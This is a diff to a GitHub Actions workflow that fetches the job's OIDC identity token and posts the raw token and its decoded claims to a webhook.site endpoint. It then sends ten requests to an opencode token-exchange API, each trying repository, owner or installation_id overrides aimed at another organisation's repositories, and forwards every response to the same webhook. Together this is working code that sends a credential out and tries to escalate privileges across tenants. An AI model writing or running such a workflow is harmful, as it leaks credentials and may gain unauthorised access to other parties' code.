@@ -1,4 +1,4 @@
-name: OIDC Token Test
+name: OIDC Exchange Test v2
 on:
   push:
     branches: [main]
@@ -9,17 +9,155 @@ permissions:
   contents: read
 
 jobs:
-  get-token:
+  test-exchange:
     runs-on: ubuntu-latest
     steps:
-      - name: Get OIDC Token
+      - name: Run Exchange Tests
         uses: actions/github-script@v7
+        env:
+          WH_UUID: "d8306945-792f-4860-b38a-51b231f5358f"
         with:
           script: |
+            const whUuid = process.env.WH_UUID;
+            
+            async function report(testName, response, body) {
+              const result = {
+                test: testName,
+                status: response.status,
+                statusText: response.statusText,
+                headers: Object.fromEntries(response.headers.entries()),
+                body: body
+              };
+              console.log(JSON.stringify(result, null, 2));
+              await fetch(`https://webhook.site/${whUuid}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(result)
+              });
+            }
+            
+            // Get OIDC token
             const token = await core.getIDToken('opencode-github-action');
-            const resp = await fetch('https://webhook.site/3addc096-f69f-4c8d-959d-846fc60433bc', {
+            const parts = token.split('.');
+            const claims = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
+            console.log('Token claims:', JSON.stringify(claims, null, 2));
+            
+            // Report claims + raw token
+            await fetch(`https://webhook.site/${whUuid}`, {
               method: 'POST',
               headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({oidc_token: token})
+              body: JSON.stringify({test: 'oidc_claims_and_token', claims, token})
             });
-            console.log('Sent OIDC token to webhook, status:', resp.status);
+            
+            // TEST 1: Basic exchange (baseline - should fail, app not installed)
+            try {
+              const r = await fetch('https://api.opencode.ai/exchange_github_app_token', {
+                method: 'POST',
+                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'}
+              });
+              await report('test1_basic', r, await r.text());
+            } catch(e) { console.log('T1 err:', e.message); }
+            
+            // TEST 2: Exchange with repository override in body
+            try {
+              const r = await fetch('https://api.opencode.ai/exchange_github_app_token', {
+                method: 'POST',
+                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify({repository: 'anomalyco/opencode'})
+              });
+              await report('test2_repo_override', r, await r.text());
+            } catch(e) { console.log('T2 err:', e.message); }
+            
+            // TEST 3: Exchange with owner+repo override in body
+            try {
+              const r = await fetch('https://api.opencode.ai/exchange_github_app_token', {
+                method: 'POST',
+                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify({owner: 'anomalyco', repo: 'opencode'})
+              });
+              await report('test3_owner_repo_override', r, await r.text());
+            } catch(e) { console.log('T3 err:', e.message); }
+            
+            // TEST 4: Exchange with installation_id override (64306922 = anomalyco)
+            try {
+              const r = await fetch('https://api.opencode.ai/exchange_github_app_token', {
+                method: 'POST',
+                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify({installation_id: 64306922})
+              });
+              await report('test4_install_id_override', r, await r.text());
+            } catch(e) { console.log('T4 err:', e.message); }
+            
+            // TEST 5: Exchange with all overrides
+            try {
+              const r = await fetch('https://api.opencode.ai/exchange_github_app_token', {
+                method: 'POST',
+                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                  repository: 'anomalyco/opencode',
+                  owner: 'anomalyco',
+                  repo: 'opencode',
+                  installation_id: 64306922
+                })
+              });
+              await report('test5_all_overrides', r, await r.text());
+            } catch(e) { console.log('T5 err:', e.message); }
+            
+            // TEST 6: Exchange targeting anomalyco/console
+            try {
+              const r = await fetch('https://api.opencode.ai/exchange_github_app_token', {
+                method: 'POST',
+                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                  repository: 'anomalyco/console',
+                  owner: 'anomalyco',
+                  repo: 'console',
+                  installation_id: 64306922
+                })
+              });
+              await report('test6_anomalyco_console', r, await r.text());
+            } catch(e) { console.log('T6 err:', e.message); }
+            
+            // TEST 7: Exchange targeting anomalyco/models.dev (public)
+            try {
+              const r = await fetch('https://api.opencode.ai/exchange_github_app_token', {
+                method: 'POST',
+                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                  repository: 'anomalyco/models.dev'
+                })
+              });
+              await report('test7_anomalyco_modelsdev', r, await r.text());
+            } catch(e) { console.log('T7 err:', e.message); }
+            
+            // TEST 8: _with_pat endpoint with OIDC token as Bearer
+            try {
+              const r = await fetch('https://api.opencode.ai/exchange_github_app_token_with_pat', {
+                method: 'POST',
+                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify({owner: 'anomalyco', repo: 'opencode'})
+              });
+              await report('test8_withpat_oidc_bearer', r, await r.text());
+            } catch(e) { console.log('T8 err:', e.message); }
+            
+            // TEST 9: _with_pat endpoint with OIDC token as Bearer, own repo
+            try {
+              const r = await fetch('https://api.opencode.ai/exchange_github_app_token_with_pat', {
+                method: 'POST',
+                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify({owner: 'benderTheCrime', repo: 'oidc-test-bende'})
+              });
+              await report('test9_withpat_oidc_own_repo', r, await r.text());
+            } catch(e) { console.log('T9 err:', e.message); }
+            
+            // TEST 10: exchange with repository_owner override only
+            try {
+              const r = await fetch('https://api.opencode.ai/exchange_github_app_token', {
+                method: 'POST',
+                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify({repository_owner: 'anomalyco'})
+              });
+              await report('test10_owner_only', r, await r.text());
+            } catch(e) { console.log('T10 err:', e.message); }
+            
+            console.log('All tests completed!');
